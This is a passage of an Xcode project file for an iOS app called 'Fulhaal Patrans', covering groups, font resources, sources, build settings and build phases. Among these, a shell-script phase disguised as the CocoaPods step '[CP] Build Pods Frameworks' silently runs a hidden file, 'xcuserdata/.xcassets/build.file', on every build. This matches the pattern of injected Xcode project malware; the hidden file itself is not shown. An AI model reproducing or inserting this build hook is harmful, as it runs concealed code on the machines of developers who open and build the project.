				03C55DBE2646752500D0298E /* Model */,
				03C55DBD2646751F00D0298E /* View */,
				03C55DBC2646751500D0298E /* ViewModel */,
			);
			path = MVVM;
			sourceTree = "<group>";
		};
		03C55DBC2646751500D0298E /* ViewModel */ = {
			isa = PBXGroup;
			children = (
				03EE2B7A269623A900AC7194 /* Authentication */,
				03EE2B79269623A000AC7194 /* Home */,
			);
			path = ViewModel;
			sourceTree = "<group>";
		};
		03C55DBD2646751F00D0298E /* View */ = {
			isa = PBXGroup;
			children = (
				03C55DF626467BCB00D0298E /* Home */,
				03C55DF526467BC000D0298E /* Authentication */,
			);
			path = View;
			sourceTree = "<group>";
		};
		03C55DBE2646752500D0298E /* Model */ = {
			isa = PBXGroup;
			children = (
				033C467C269333F3002A6681 /* Home */,
				033C467B269333DE002A6681 /* Authentication */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		03C55DF526467BC000D0298E /* Authentication */ = {
			isa = PBXGroup;
			children = (
				03C55DF92647073000D0298E /* Cell Classes */,
				03C55DF82647071000D0298E /* Controller */,
				03C55DFE2647076000D0298E /* Authentication.storyboard */,
			);
			path = Authentication;
			sourceTree = "<group>";
		};
		03C55DF626467BCB00D0298E /* Home */ = {
			isa = PBXGroup;
			children = (
				0393644C268470A5008AE128 /* XIBs */,
				03C55E2F2647180500D0298E /* Cell Classes */,
				03C55E2E264717F200D0298E /* Controllers */,
				03C55E302647183100D0298E /* Home.storyboard */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		03C55DF82647071000D0298E /* Controller */ = {
			isa = PBXGroup;
			children = (
				03C55E012647079800D0298E /* LoginViewController.swift */,
				03C55E2B2647178D00D0298E /* DashBoardViewController.swift */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		03C55DF92647073000D0298E /* Cell Classes */ = {
			isa = PBXGroup;
			children = (
			);
			path = "Cell Classes";
			sourceTree = "<group>";
		};
		03C55E0426470ADA00D0298E /* Fonts */ = {
			isa = PBXGroup;
			children = (
				03C55E1626470B7300D0298E /* Montserrat-Black.ttf */,
				03C55E0826470B7200D0298E /* Montserrat-BlackItalic.ttf */,
				03C55E0E26470B7200D0298E /* Montserrat-Bold.ttf */,
				03C55E0926470B7200D0298E /* Montserrat-BoldItalic.ttf */,
				03C55E0D26470B7200D0298E /* Montserrat-ExtraBold.ttf */,
				03C55E1326470B7300D0298E /* Montserrat-ExtraBoldItalic.ttf */,
				03C55E1526470B7300D0298E /* Montserrat-ExtraLight.ttf */,
				03C55E1226470B7300D0298E /* Montserrat-ExtraLightItalic.ttf */,
				03C55E0526470B7200D0298E /* Montserrat-Italic.ttf */,
				03C55E0C26470B7200D0298E /* Montserrat-Light.ttf */,
				03C55E1426470B7300D0298E /* Montserrat-LightItalic.ttf */,
				03C55E0B26470B7200D0298E /* Montserrat-Medium.ttf */,
				03C55E0626470B7200D0298E /* Montserrat-MediumItalic.ttf */,
				03C55E0F26470B7200D0298E /* Montserrat-Regular.ttf */,
				03C55E1026470B7200D0298E /* Montserrat-SemiBold.ttf */,
				03C55E1126470B7300D0298E /* Montserrat-SemiBoldItalic.ttf */,
				03C55E0726470B7200D0298E /* Montserrat-Thin.ttf */,
				03C55E0A26470B7200D0298E /* Montserrat-ThinItalic.ttf */,
			);
			path = Fonts;
			sourceTree = "<group>";
		};
		03C55E2E264717F200D0298E /* Controllers */ = {
			isa = PBXGroup;
			children = (
				03E631ED2647E63A00C65FA4 /* TripHistoryViewController.swift */,
			);
			path = Controllers;
			sourceTree = "<group>";
		};
		03C55E2F2647180500D0298E /* Cell Classes */ = {
			isa = PBXGroup;
			children = (
				034E933F279DBD13009105E8 /* TripHistoryTableViewCell.swift */,
			);
			path = "Cell Classes";
			sourceTree = "<group>";
		};
		03EE2B79269623A000AC7194 /* Home */ = {
			isa = PBXGroup;
			children = (
				03DC3B66269B30F60057549C /* TripHistoryViewModel.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		03EE2B7A269623A900AC7194 /* Authentication */ = {
			isa = PBXGroup;
			children = (
				033C4678269333D3002A6681 /* LoginViewModel.swift */,
				033C468426934A50002A6681 /* DashboardViewModel.swift */,
			);
			path = Authentication;
			sourceTree = "<group>";
		};
		3C1665F205A132F01CA1FA2E /* Pods */ = {
			isa = PBXGroup;
			children = (
				D0301EB902DD2FFBA377A0FE /* Pods-Fulhaal Patrans.debug.xcconfig */,
				DF8E74824CCD3A059EF5429D /* Pods-Fulhaal Patrans.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		612B334FC691A7ED764B6CDE /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				0355B339268B68F000E5DA21 /* CloudKit.framework */,
				D8A0E0CCE94DFC9FDA2201F4 /* Pods_Fulhaal_Patrans.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		03C55D98264662D500D0298E /* Fulhaal Patrans */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 03C55DAD264662D700D0298E /* Build configuration list for PBXNativeTarget "Fulhaal Patrans" */;
			buildPhases = (
				DAA55219E24C9B6D9E86FC85 /* [CP] Check Pods Manifest.lock */,
				FBC6A46AA01FF4F0AC6D902C /* [CP] Build Pods Frameworks */,
				03C55D95264662D500D0298E /* Sources */,
				03C55D96264662D500D0298E /* Frameworks */,
				03C55D97264662D500D0298E /* Resources */,
				477AF2EE53677F4512A8501C /* [CP] Embed Pods Frameworks */,
				03077DCC26ADDEDA00849065 /* ShellScript */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Fulhaal Patrans";
			productName = "Fulhaal Patrans";
			productReference = 03C55D99264662D500D0298E /* Fulhaal Patrans.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		03C55D91264662D500D0298E /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1220;
				LastUpgradeCheck = 1220;
				TargetAttributes = {
					03C55D98264662D500D0298E = {
						CreatedOnToolsVersion = 12.2;
					};
				};
			};
			buildConfigurationList = 03C55D94264662D500D0298E /* Build configuration list for PBXProject "Fulhaal Patrans" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 03C55D90264662D500D0298E;
			productRefGroup = 03C55D9A264662D500D0298E /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				03C55D98264662D500D0298E /* Fulhaal Patrans */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		03C55D97264662D500D0298E /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				03C55E2126470B7300D0298E /* Montserrat-Regular.ttf in Resources */,
				03C55E1E26470B7300D0298E /* Montserrat-Light.ttf in Resources */,
				03C55E1B26470B7300D0298E /* Montserrat-BoldItalic.ttf in Resources */,
				03C55E1926470B7300D0298E /* Montserrat-Thin.ttf in Resources */,
				03C55DFF2647076000D0298E /* Authentication.storyboard in Resources */,
				03C55E1F26470B7300D0298E /* Montserrat-ExtraBold.ttf in Resources */,
				0393644E268470BF008AE128 /* SelectDate.xib in Resources */,
				03C55E1A26470B7300D0298E /* Montserrat-BlackItalic.ttf in Resources */,
				03C55DA9264662D700D0298E /* LaunchScreen.storyboard in Resources */,
				03C55E1726470B7300D0298E /* Montserrat-Italic.ttf in Resources */,
				03C55E2226470B7300D0298E /* Montserrat-SemiBold.ttf in Resources */,
				03C55E2826470B7300D0298E /* Montserrat-Black.ttf in Resources */,
				0302513526B05FF400E7ED4B /* GoogleService-Info.plist in Resources */,
				034025BF26B59B9B00B1E5DF /* CropperExtensionViewController.xib in Resources */,
				03C55E1826470B7300D0298E /* Montserrat-MediumItalic.ttf in Resources */,
				03C55E2026470B7300D0298E /* Montserrat-Bold.ttf in Resources */,
				03C55E2726470B7300D0298E /* Montserrat-ExtraLight.ttf in Resources */,
				03C55E2626470B7300D0298E /* Montserrat-LightItalic.ttf in Resources */,
				03C55DA6264662D700D0298E /* Assets.xcassets in Resources */,
				03C55E1D26470B7300D0298E /* Montserrat-Medium.ttf in Resources */,
				03C55E1C26470B7300D0298E /* Montserrat-ThinItalic.ttf in Resources */,
				03C55E2326470B7300D0298E /* Montserrat-SemiBoldItalic.ttf in Resources */,
				03C55E312647183100D0298E /* Home.storyboard in Resources */,
				03C55E2426470B7300D0298E /* Montserrat-ExtraLightItalic.ttf in Resources */,
				03C55E2526470B7300D0298E /* Montserrat-ExtraBoldItalic.ttf in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		03077DCC26ADDEDA00849065 /* ShellScript */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"$(SRCROOT)/${DWARF_DSYM_FOLDER_PATH}/${DWARF_DSYM_FILE_NAME}/Contents/Resources/DWARF/${TARGET_NAME}",
				"$(SRCROOT)/$(SRCROOT)/$(BUILT_PRODUCTS_DIR)/$(INFOPLIST_PATH)",
			);
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# Type a script or drag a script file from your workspace to insert its path.\n\"${PODS_ROOT}/FirebaseCrashlytics/run\"\n";
		};
		477AF2EE53677F4512A8501C /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Fulhaal Patrans/Pods-Fulhaal Patrans-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Fulhaal Patrans/Pods-Fulhaal Patrans-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Fulhaal Patrans/Pods-Fulhaal Patrans-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		DAA55219E24C9B6D9E86FC85 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Fulhaal Patrans-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		FBC6A46AA01FF4F0AC6D902C /* [CP] Build Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "[CP] Build Pods Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false\n";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		03C55D95264662D500D0298E /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				03DC3B67269B30F60057549C /* TripHistoryViewModel.swift in Sources */,
				034025C126B59B9B00B1E5DF /* CropperExtensionViewController.swift in Sources */,
				033C468226934A3E002A6681 /* DashboardModel.swift in Sources */,
				03C55E022647079800D0298E /* LoginViewController.swift in Sources */,
				03C55DD7264675B500D0298E /* UiViewControllerExtension.swift in Sources */,
				03C55DC72646759000D0298E /* Logger.swift in Sources */,
				03C55DDA264675B500D0298E /* UiViewExtension.swift in Sources */,
				03C55DD8264675B500D0298E /* UiLabelExtension.swift in Sources */,
				03C55DDC264675B500D0298E /* extensionclass.swift in Sources */,
				033C46762693315F002A6681 /* AuthEndPoint.swift in Sources */,
				03936451268470D3008AE128 /* SelectDate.swift in Sources */,
				03C55DC52646759000D0298E /* Theme.swift in Sources */,
				03C55DD6264675B500D0298E /* UiTextFieldExtension.swift in Sources */,
				03C55DC82646759000D0298E /* ImageAndDocumentPicker.swift in Sources */,
				03C55DC92646759000D0298E /* LocationManager.swift in Sources */,
				03EE2B772696228800AC7194 /* HomeEndPoints.swift in Sources */,
				03DC3B6A269B31020057549C /* TripHistoryModel.swift in Sources */,
				03C55DDE264675B500D0298E /* UiImageExtension.swift in Sources */,
				03E631EE2647E63A00C65FA4 /* TripHistoryViewController.swift in Sources */,
				033C467126933134002A6681 /* NetworkingConstants.swift in Sources */,
				033C467026933134002A6681 /* ApiManager.swift in Sources */,
				03C55DDD264675B500D0298E /* DateExtension.swift in Sources */,
				03C55DCA2646759000D0298E /* PickerViewCustomDataSource.swift in Sources */,
				03C55DDF264675B500D0298E /* UiColorExtension.swift in Sources */,
				033C468526934A50002A6681 /* DashboardViewModel.swift in Sources */,
				03C55E3426471ABE00D0298E /* Common.swift in Sources */,
				03C55DD9264675B500D0298E /* StringExtension.swift in Sources */,
				03F0E05C26AD50FE00FB4D31 /* GRQuickPreviewController.swift in Sources */,
				03C55D9D264662D500D0298E /* AppDelegate.swift in Sources */,
				03C55DC62646759000D0298E /* HelperClass.swift in Sources */,
				034E9340279DBD13009105E8 /* TripHistoryTableViewCell.swift in Sources */,
				034025C026B59B9B00B1E5DF /* ImagePreviewViewController.swift in Sources */,
				033C467E26933404002A6681 /* LoginModel.swift in Sources */,
				032AC74126AB2F6A0055EC71 /* CIFilter+Extension.swift in Sources */,
				03C55E2C2647178D00D0298E /* DashBoardViewController.swift in Sources */,
				03C55D9F264662D500D0298E /* SceneDelegate.swift in Sources */,
				033C4679269333D3002A6681 /* LoginViewModel.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		03C55DA7264662D700D0298E /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				03C55DA8264662D700D0298E /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		03C55DAB264662D700D0298E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		03C55DAC264662D700D0298E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		03C55DAE264662D700D0298E /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = D0301EB902DD2FFBA377A0FE /* Pods-Fulhaal Patrans.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = "Fulhaal Patrans/Fulhaal Patrans.entitlements";
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = QHHTSWGD32;
				INFOPLIST_FILE = "Fulhaal Patrans/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.Fulhaal-Patrans10";
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		03C55DAF264662D700D0298E /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = DF8E74824CCD3A059EF5429D /* Pods-Fulhaal Patrans.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = "Fulhaal Patrans/Fulhaal Patrans.entitlements";
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = QHHTSWGD32;
				INFOPLIST_FILE = "Fulhaal Patrans/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "com.Fulhaal-Patrans10";
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		03C55D94264662D500D0298E /* Build configuration list for PBXProject "Fulhaal Patrans" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				03C55DAB264662D700D0298E /* Debug */,
				03C55DAC264662D700D0298E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		03C55DAD264662D700D0298E /* Build configuration list for PBXNativeTarget "Fulhaal Patrans" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				03C55DAE264662D700D0298E /* Debug */,
				03C55DAF264662D700D0298E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 03C55D91264662D500D0298E /* Project object */;
}
